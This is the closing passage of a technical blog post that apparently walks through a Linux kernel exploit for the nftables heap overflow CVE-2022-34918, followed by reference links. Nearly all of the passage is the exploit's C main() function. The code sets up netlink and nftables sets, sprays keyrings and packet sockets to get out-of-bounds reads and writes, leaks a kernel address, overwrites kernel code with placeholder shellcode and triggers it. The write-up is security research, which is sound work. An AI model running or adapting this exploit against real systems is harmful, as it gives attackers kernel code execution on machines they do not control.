</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>packet_socket_setup</span>(size, <span style=color:#40a070>2048</span>, count, <span style=color:#40a070>0</span>, <span style=color:#40a070>1000</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>int8_t</span> shellcode[] <span style=color:#666>=</span> {<span style=color:#40a070>0xCC</span>, <span style=color:#40a070>0xCC</span>, <span style=color:#40a070>0xCC</span>, <span style=color:#40a070>0xCC</span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>main</span>() {
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> nlsock;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> sockaddr_nl snl;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> keyring_payload leak_payload;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>char</span> buf[USHRT_MAX <span style=color:#666>+</span> <span style=color:#40a070>0x10</span>] <span style=color:#666>=</span> {};
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> nbytes;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>new_ns</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// create netlink socket
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlsock <span style=color:#666>=</span> <span style=color:#06287e>socket</span>(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (nlsock <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] socket&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>1</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>snl, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(snl));
</span></span><span style=display:flex><span>  snl.nl_family <span style=color:#666>=</span> AF_NETLINK;
</span></span><span style=display:flex><span>  snl.nl_groups <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>  snl.nl_pid <span style=color:#666>=</span> <span style=color:#06287e>getpid</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>bind</span>(nlsock, (<span style=color:#007020;font-weight:700>struct</span> sockaddr <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>snl, <span style=color:#007020;font-weight:700>sizeof</span>(snl))) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] bind&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>1</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[+] NL sock binded</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>create_nft_table</span>(nlsock, TABLENAME);
</span></span><span style=display:flex><span>  <span style=color:#06287e>create_nft_set</span>(nlsock, LEAK_SET_NAME, KMALLOC64_KEYLEN,
</span></span><span style=display:flex><span>                 <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> keyring_payload), TABLENAME, <span style=color:#40a070>1337</span>);
</span></span><span style=display:flex><span>  <span style=color:#06287e>create_nft_set</span>(nlsock, WRITE_SET_NAME, KMALLOC64_KEYLEN,
</span></span><span style=display:flex><span>                 <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> pg_vec_write_payload), TABLENAME, <span style=color:#40a070>7331</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#902000>key_serial_t</span> <span style=color:#666>*</span>fenshui_key <span style=color:#666>=</span>
</span></span><span style=display:flex><span>      <span style=color:#06287e>spray_keyring</span>(N_FENSHUI_KEYRING);  <span style=color:#60a0b0;font-style:italic>// simple heap fenshui: fill holes
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#902000>key_serial_t</span> <span style=color:#666>*</span>keyrings <span style=color:#666>=</span> <span style=color:#06287e>spray_keyring</span>(N_SPRAY_KEYRING);  <span style=color:#60a0b0;font-style:italic>// spray kmalloc-64
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N_SPRAY_KEYRING; i <span style=color:#666>+=</span> <span style=color:#40a070>10</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>key_unlink</span>(keyrings[i]);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>leak_payload, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(leak_payload));
</span></span><span style=display:flex><span>  leak_payload.len <span style=color:#666>=</span> USHRT_MAX <span style=color:#666>-</span> <span style=color:#40a070>1</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[!] heap overflowing..</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> oob_idx <span style=color:#666>=</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>;
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> ntry <span style=color:#666>=</span> <span style=color:#40a070>50</span>;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>while</span> (<span style=color:#40a070>1</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>add_elem_to_nft_set</span>(nlsock, LEAK_SET_NAME, KMALLOC64_KEYLEN, TABLENAME,
</span></span><span style=display:flex><span>                        <span style=color:#40a070>1337</span>, <span style=color:#007020;font-weight:700>sizeof</span>(leak_payload), (<span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>leak_payload);
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N_SPRAY_KEYRING; i<span style=color:#666>++</span>) {
</span></span><span style=display:flex><span>      <span style=color:#06287e>memset</span>(buf, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(buf));
</span></span><span style=display:flex><span>      nbytes <span style=color:#666>=</span> <span style=color:#06287e>key_read</span>(keyrings[i], buf, <span style=color:#007020;font-weight:700>sizeof</span>(buf));
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> (nbytes <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>continue</span>;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> (nbytes <span style=color:#666>==</span> USHRT_MAX <span style=color:#666>-</span> <span style=color:#40a070>1</span>) {
</span></span><span style=display:flex><span>        <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[+] oob read!</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>        oob_idx <span style=color:#666>=</span> i;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>break</span>;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (oob_idx <span style=color:#666>!=</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>) {
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>break</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (ntry) {
</span></span><span style=display:flex><span>      ntry<span style=color:#666>--</span>;
</span></span><span style=display:flex><span>    } <span style=color:#007020;font-weight:700>else</span> {
</span></span><span style=display:flex><span>      <span style=color:#06287e>fprintf</span>(stderr, <span style=color:#4070a0>&#34;[-] failed to do oob read</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>      <span style=color:#06287e>exit</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N_SPRAY_KEYRING; i<span style=color:#666>++</span>) {
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (i <span style=color:#666>!=</span> oob_idx) {
</span></span><span style=display:flex><span>      <span style=color:#06287e>key_revoke</span>(keyrings[i]);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>key_read</span>(keyrings[oob_idx], buf, <span style=color:#007020;font-weight:700>sizeof</span>(buf));
</span></span><span style=display:flex><span>  <span style=color:#902000>uint64_t</span> user_free_payload_rcu_addr <span style=color:#666>=</span> <span style=color:#666>*</span>(<span style=color:#902000>uint64_t</span> <span style=color:#666>*</span>)((<span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>)buf <span style=color:#666>+</span> <span style=color:#40a070>0x30</span>);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (user_free_payload_rcu_addr <span style=color:#666>&lt;</span> <span style=color:#40a070>0xffffffff81000000</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>fprintf</span>(stderr, <span style=color:#4070a0>&#34;[-] failed to leak, read 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,
</span></span><span style=display:flex><span>            user_free_payload_rcu_addr);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>2</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[+] leak: user_free_payload_rcu: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,
</span></span><span style=display:flex><span>         user_free_payload_rcu_addr);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// write to pg_vec
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>// spray packet socket
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#902000>int</span> packet_fds[N_SPRAY_PACKET_SOCK] <span style=color:#666>=</span> {};
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> fenshui_packet_fds[N_SPRAY_FENSHUI_PACKET_SOCK] <span style=color:#666>=</span> {};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[+] simple kmalloc-64 fenshui</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N_SPRAY_FENSHUI_PACKET_SOCK; i<span style=color:#666>++</span>) {
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (i <span style=color:#666>!=</span> <span style=color:#40a070>0</span> <span style=color:#666>&amp;&amp;</span> i <span style=color:#666>%</span> <span style=color:#40a070>0x10</span> <span style=color:#666>==</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>      <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[!] %x/%x done</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, i, N_SPRAY_FENSHUI_PACKET_SOCK);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    fenshui_packet_fds[i] <span style=color:#666>=</span> <span style=color:#06287e>pagealloc_pad</span>(<span style=color:#40a070>5</span>, <span style=color:#40a070>0x1000</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[+] spraying packet sock</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N_SPARY_PACKET_SOCK_HOLE; i<span style=color:#666>++</span>) {
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (i <span style=color:#666>!=</span> <span style=color:#40a070>0</span> <span style=color:#666>&amp;&amp;</span> i <span style=color:#666>%</span> <span style=color:#40a070>0x10</span> <span style=color:#666>==</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>      <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[!] %x/%x done</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, i, N_SPARY_PACKET_SOCK_HOLE);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    packet_fds[i] <span style=color:#666>=</span> <span style=color:#06287e>pagealloc_pad</span>(<span style=color:#40a070>5</span>, <span style=color:#40a070>0x1000</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N_SPRAY_PACKET_SOCK; i <span style=color:#666>+=</span> N_SPARY_PACKET_SOCK_HOLE) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>close</span>(packet_fds[i]);
</span></span><span style=display:flex><span>    packet_fds[i] <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[!] ready to oob write</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> pg_vec_write_payload write_payload;
</span></span><span style=display:flex><span>  write_payload.buff[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> user_free_payload_rcu_addr;
</span></span><span style=display:flex><span>  write_payload.buff[<span style=color:#40a070>1</span>] <span style=color:#666>=</span> write_payload.buff[<span style=color:#40a070>0</span>] <span style=color:#666>+</span> PAGE_SIZE;
</span></span><span style=display:flex><span>  write_payload.buff[<span style=color:#40a070>2</span>] <span style=color:#666>=</span> write_payload.buff[<span style=color:#40a070>1</span>] <span style=color:#666>+</span> PAGE_SIZE;
</span></span><span style=display:flex><span>  write_payload.buff[<span style=color:#40a070>3</span>] <span style=color:#666>=</span> write_payload.buff[<span style=color:#40a070>2</span>] <span style=color:#666>+</span> PAGE_SIZE;
</span></span><span style=display:flex><span>  write_payload.buff[<span style=color:#40a070>4</span>] <span style=color:#666>=</span> write_payload.buff[<span style=color:#40a070>3</span>] <span style=color:#666>+</span> PAGE_SIZE;
</span></span><span style=display:flex><span>  ntry <span style=color:#666>=</span> <span style=color:#40a070>50</span>;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>while</span> (<span style=color:#40a070>1</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>add_elem_to_nft_set</span>(nlsock, WRITE_SET_NAME, KMALLOC64_KEYLEN, TABLENAME,
</span></span><span style=display:flex><span>                        <span style=color:#40a070>7331</span>, <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> pg_vec_write_payload),
</span></span><span style=display:flex><span>                        (<span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>write_payload);
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N_SPRAY_PACKET_SOCK; i<span style=color:#666>++</span>) {
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>packet_fds[i]) {
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>continue</span>;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>      <span style=color:#902000>char</span> <span style=color:#666>*</span>page <span style=color:#666>=</span> (<span style=color:#902000>char</span> <span style=color:#666>*</span>)<span style=color:#06287e>mmap</span>(<span style=color:#007020>NULL</span>, PAGE_SIZE <span style=color:#666>*</span> <span style=color:#40a070>5</span>, PROT_READ <span style=color:#666>|</span> PROT_WRITE,
</span></span><span style=display:flex><span>                                MAP_SHARED, packet_fds[i], <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>page <span style=color:#666>||</span> (<span style=color:#902000>size_t</span>)page <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>        <span style=color:#06287e>fprintf</span>(stderr, <span style=color:#4070a0>&#34;[!] mmap error: %p</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, page);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>continue</span>;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#902000>int</span> j;
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>for</span> (j <span style=color:#666>=</span> <span style=color:#40a070>0x30</span>; j <span style=color:#666>&lt;</span> <span style=color:#40a070>0x1000</span>; j<span style=color:#666>++</span>) {
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (page[j] <span style=color:#666>!=</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>          <span style=color:#007020;font-weight:700>break</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> (j <span style=color:#666>!=</span> <span style=color:#40a070>0x1000</span>) {
</span></span><span style=display:flex><span>        <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[+] found non empty page</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#902000>void</span> <span style=color:#666>*</span>func_pos <span style=color:#666>=</span> (<span style=color:#902000>uint64_t</span> <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>page[user_free_payload_rcu_addr <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFF</span>];
</span></span><span style=display:flex><span>        <span style=color:#902000>uint8_t</span> original_code[<span style=color:#007020;font-weight:700>sizeof</span>(shellcode)] <span style=color:#666>=</span> {<span style=color:#40a070>0</span>};
</span></span><span style=display:flex><span>        <span style=color:#06287e>memcpy</span>(original_code, func_pos, <span style=color:#007020;font-weight:700>sizeof</span>(shellcode));
</span></span><span style=display:flex><span>        <span style=color:#06287e>memcpy</span>(func_pos, shellcode, <span style=color:#007020;font-weight:700>sizeof</span>(shellcode));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#902000>key_serial_t</span> fd <span style=color:#666>=</span> <span style=color:#06287e>key_alloc</span>(<span style=color:#4070a0>&#34;trigger shellcode&#34;</span>, <span style=color:#4070a0>&#34;DEADBEEF&#34;</span>, <span style=color:#40a070>8</span>);
</span></span><span style=display:flex><span>        <span style=color:#06287e>key_revoke</span>(fd);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#06287e>memcpy</span>(func_pos, original_code, <span style=color:#007020;font-weight:700>sizeof</span>(shellcode));
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (ntry) {
</span></span><span style=display:flex><span>      ntry<span style=color:#666>--</span>;
</span></span><span style=display:flex><span>    } <span style=color:#007020;font-weight:700>else</span> {
</span></span><span style=display:flex><span>      <span style=color:#06287e>fprintf</span>(stderr, <span style=color:#4070a0>&#34;[-] failed to oob write</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>      <span style=color:#06287e>exit</span>(<span style=color:#40a070>2</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=refrences><span class=section-num>7</span> Refrences</h2><ul><li><a href=https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/>基于 USMA 的内核通用 EXP 编写思路在 CVE-2022-34918 上的实践</a></li><li><a href=https://bsauce.github.io/2022/07/26/CVE-2022-34918/>【kernel exploit】CVE-2022-34918 nftable 堆溢出漏洞利用（list_head 任意写）</a></li></ul></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>